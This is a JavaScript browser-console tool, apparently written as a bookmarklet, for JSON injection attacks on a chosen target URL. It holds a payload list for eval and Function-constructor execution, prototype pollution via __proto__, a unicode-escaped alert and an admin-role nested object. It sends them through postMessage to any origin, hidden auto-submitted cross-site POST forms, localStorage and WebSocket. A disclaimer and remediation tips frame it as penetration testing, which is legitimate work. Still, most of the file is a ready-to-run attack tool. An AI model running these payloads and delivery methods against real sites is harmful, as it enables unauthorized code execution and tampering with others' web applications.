/**
 * JSON Injection Vulnerability Testing Tool
 * 
 * By: Zl0y
 * Description: Console-based tool for testing JSON injection vulnerabilities
 * Usage: Run in browser console on target domain or use as bookmarklet
 * Target: Applications that process JSON data without proper validation
 * 
 * DISCLAIMER: This tool is for authorized penetration testing and educational 
 * purposes only. Use only on systems you own or have explicit permission to test.
 */

// Configuration object
const CONFIG = {
    // Target configuration
    TARGET_URL: 'https://test.lab/',
    TARGET_WINDOW_NAME: 'jsonInjectionTarget',
    
    // Vulnerable parameter identification
    VULNERABLE_PARAM: 'data', // Common parameter names to test
    
    // Timing configuration
    INITIAL_DELAY: 3000,     // Wait before starting attack
    PAYLOAD_DELAY: 3000,     // Delay between payloads
    FINAL_DELAY: 15000,      // Final check delay
    
    // Visual configuration
    COLORS: {
        start: 'color: red; font-size: 16px; font-weight: bold;',
        info: 'color: blue; font-weight: bold;',
        success: 'color: green; font-weight: bold;',
        warning: 'color: orange; font-weight: bold;'
    }
};

/**
 * JSON Injection Payload Generator
 * Generates various payloads to test different injection vectors
 */
class JSONInjectionTester {
    constructor(config = CONFIG) {
        this.config = config;
        this.targetWindow = null;
        this.testResults = [];
    }

    /**
     * Generate test payloads for JSON injection
     * @returns {Array} Array of payload objects
     */
    generatePayloads() {
        return [
            {
                name: 'JSON Structure Break',
                description: 'Tests for JSON parsing errors and structure manipulation',
                payload: `{"${this.config.VULNERABLE_PARAM}": "valid"} + alert("JSON_BREAK_SUCCESS"); {"fake": "end"}`,
                expectedResult: 'JavaScript execution or parsing error'
            },
            {
                name: 'Eval Execution Test',
                description: 'Attempts code execution through eval() function',
                payload: `{"${this.config.VULNERABLE_PARAM}": "eval(\\"alert(\\\\\\"EVAL_EXECUTION_SUCCESS\\\\\\")\\")", "test": "data"}`,
                expectedResult: 'Code execution through eval()'
            },
            {
                name: 'Prototype Pollution',
                description: 'Tests for prototype chain manipulation',
                payload: `{"__proto__": {"isHacked": true, "injected": "prototype_pollution_success"}}`,
                expectedResult: 'Object prototype modification'
            },
            {
                name: 'Function Constructor Injection',
                description: 'Attempts execution via Function constructor',
                payload: `{"${this.config.VULNERABLE_PARAM}": "Function('return alert(\\"FUNCTION_CONSTRUCTOR_SUCCESS\\")')()"}`,
                expectedResult: 'Code execution through Function constructor'
            },
            {
                name: 'Promise Chain Bypass',
                description: 'Tests for promise-based execution bypass',
                payload: `{"${this.config.VULNERABLE_PARAM}": "test"}, console.log("PROMISE_BYPASS_SUCCESS")//rest__promise_${Date.now()}`,
                expectedResult: 'Console execution bypass'
            },
            {
                name: 'Unicode Escape Injection',
                description: 'Tests for Unicode escape sequence processing',
                payload: `{"${this.config.VULNERABLE_PARAM}": "\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0022UNICODE_SUCCESS\\u0022\\u0029"}`,
                expectedResult: 'Unicode decode execution'
            },
            {
                name: 'Nested Object Injection',
                description: 'Tests nested object manipulation',
                payload: `{"user": {"role": "admin"}, "${this.config.VULNERABLE_PARAM}": {"exec": "alert('NESTED_SUCCESS')"}}`,
                expectedResult: 'Nested object privilege escalation'
            }
        ];
    }

    /**
     * Initialize the testing environment
     */
    initialize() {
        console.log('%c🎯 JSON Injection Testing Tool - Starting', this.config.COLORS.start);
        console.log('%c📋 Target: ' + this.config.TARGET_URL, this.config.COLORS.info);
        console.log('%c🔍 Testing parameter: ' + this.config.VULNERABLE_PARAM, this.config.COLORS.info);
        console.log('%c⚠️  Use only on authorized targets!', this.config.COLORS.warning);
        
        // Open target window
        this.targetWindow = window.open(this.config.TARGET_URL, this.config.TARGET_WINDOW_NAME);
        
        if (!this.targetWindow) {
            console.error('%c❌ Failed to open target window. Check popup blockers.', this.config.COLORS.warning);
            return false;
        }
        
        return true;
    }

    /**
     * Execute a single payload test
     * @param {Object} payloadObj - Payload object with name, description, and payload
     * @param {number} index - Payload index for logging
     */
    executePayload(payloadObj, index) {
        console.log(`%c🚀 [${index + 1}] Testing: ${payloadObj.name}`, this.config.COLORS.info);
        console.log(`   Description: ${payloadObj.description}`);
        console.log(`   Expected: ${payloadObj.expectedResult}`);
        console.log(`   Payload: ${payloadObj.payload.substring(0, 100)}${payloadObj.payload.length > 100 ? '...' : ''}`);
        
        try {
            // Send via postMessage (cross-origin messaging)
            this.targetWindow.postMessage(payloadObj.payload, '*');
            
            // Alternative delivery methods for comprehensive testing
            this.sendViaMultipleMethods(payloadObj.payload);
            
            this.testResults.push({
                name: payloadObj.name,
                payload: payloadObj.payload,
                timestamp: new Date().toISOString(),
                status: 'sent'
            });
            
        } catch (error) {
            console.error(`❌ Error executing payload ${index + 1}:`, error);
            this.testResults.push({
                name: payloadObj.name,
                payload: payloadObj.payload,
                timestamp: new Date().toISOString(),
                status: 'error',
                error: error.message
            });
        }
    }

    /**
     * Send payload via multiple methods for comprehensive testing
     * @param {string} payload - The JSON injection payload
     */
    sendViaMultipleMethods(payload) {
        // Method 1: URL parameters (if target accepts GET parameters)
        const urlWithPayload = `${this.config.TARGET_URL}?${this.config.VULNERABLE_PARAM}=${encodeURIComponent(payload)}`;
        
        // Method 2: Attempt localStorage injection (if accessible)
        try {
            localStorage.setItem('test_json_injection', payload);
        } catch (e) {
            // Cross-origin restriction expected
        }
        
        // Method 3: Create and trigger hidden form submission
        this.createFormInjection(payload);
        
        // Method 4: WebSocket message (if WebSocket connection exists)
        this.attemptWebSocketInjection(payload);
    }

    /**
     * Create hidden form for POST injection testing
     * @param {string} payload - The JSON injection payload
     */
    createFormInjection(payload) {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = this.config.TARGET_URL;
        form.target = this.config.TARGET_WINDOW_NAME;
        form.style.display = 'none';
        
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = this.config.VULNERABLE_PARAM;
        input.value = payload;
        
        form.appendChild(input);
        document.body.appendChild(form);
        
        // Submit form after short delay
        setTimeout(() => {
            form.submit();
            document.body.removeChild(form);
        }, 500);
    }

    /**
     * Attempt WebSocket injection if connection exists
     * @param {string} payload - The JSON injection payload
     */
    attemptWebSocketInjection(payload) {
        // Check if target has WebSocket connections
        if (typeof WebSocket !== 'undefined') {
            try {
                const wsUrl = this.config.TARGET_URL.replace('http', 'ws') + 'websocket';
                const ws = new WebSocket(wsUrl);
                
                ws.onopen = () => {
                    ws.send(JSON.stringify({[this.config.VULNERABLE_PARAM]: payload}));
                    ws.close();
                };
                
                ws.onerror = () => {
                    // WebSocket connection failed - expected for most targets
                };
            } catch (e) {
                // WebSocket not available or failed
            }
        }
    }

    /**
     * Run complete JSON injection test suite
     */
    async runTests() {
        if (!this.initialize()) {
            return;
        }

        console.log('%c⏳ Waiting for target to load...', this.config.COLORS.info);
        
        // Wait for target window to load
        await new Promise(resolve => setTimeout(resolve, this.config.INITIAL_DELAY));
        
        const payloads = this.generatePayloads();
        console.log(`%c📦 Generated ${payloads.length} test payloads`, this.config.COLORS.info);
        
        // Execute each payload with delay
        for (let i = 0; i < payloads.length; i++) {
            this.executePayload(payloads[i], i);
            
            if (i < payloads.length - 1) {
                await new Promise(resolve => setTimeout(resolve, this.config.PAYLOAD_DELAY));
            }
        }
        
        // Final results
        setTimeout(() => {
            this.showResults();
        }, this.config.FINAL_DELAY);
    }

    /**
     * Display test results and instructions
     */
    showResults() {
        console.log('%c🔍 JSON Injection Test Complete!', this.config.COLORS.success);
        console.log('');
        console.log('%c📊 Test Summary:', this.config.COLORS.info);
        console.table(this.testResults);
        console.log('');
        console.log('%c🔍 Manual Verification Steps:', this.config.COLORS.warning);
        console.log('1. Check target window console for JavaScript errors');
        console.log('2. Look for alert dialogs or unexpected behavior');
        console.log('3. Inspect network requests for malformed JSON');
        console.log('4. Check for prototype pollution: Object.prototype.isHacked');
        console.log('5. Monitor application logs for parsing errors');
        console.log('');
        console.log('%c💡 Remediation Recommendations:', this.config.COLORS.info);
        console.log('• Implement proper JSON schema validation');
        console.log('• Sanitize all user inputs before JSON parsing');
        console.log('• Use JSON.parse() with reviver function for filtering');
        console.log('• Implement Content Security Policy (CSP)');
        console.log('• Avoid eval() and Function() constructors');
    }

    /**
     * Static method to create and run quick test
     * @param {string} targetUrl - Target URL to test
     * @param {string} paramName - Vulnerable parameter name
     */
    static quickTest(targetUrl = 'https://test.lab/', paramName = 'data') {
        const config = {
            ...CONFIG,
            TARGET_URL: targetUrl,
            VULNERABLE_PARAM: paramName
        };
        
        const tester = new JSONInjectionTester(config);
        tester.runTests();
        
        return tester;
    }
}

// Auto-execution if run directly in console
if (typeof window !== 'undefined' && window.console) {
    console.log('%c🛠️  JSON Injection Testing Tool Loaded', 'color: purple; font-size: 14px; font-weight: bold;');
    console.log('Usage examples:');
    console.log('1. JSONInjectionTester.quickTest("https://target.com/", "vulnerableParam")');
    console.log('2. const tester = new JSONInjectionTester(); tester.runTests();');
    console.log('3. Auto-run: uncomment the line below');
    
    // Uncomment to auto-run with default settings
    // JSONInjectionTester.quickTest();
}

// Export for module systems
if (typeof module !== 'undefined' && module.exports) {
    module.exports = JSONInjectionTester;
}
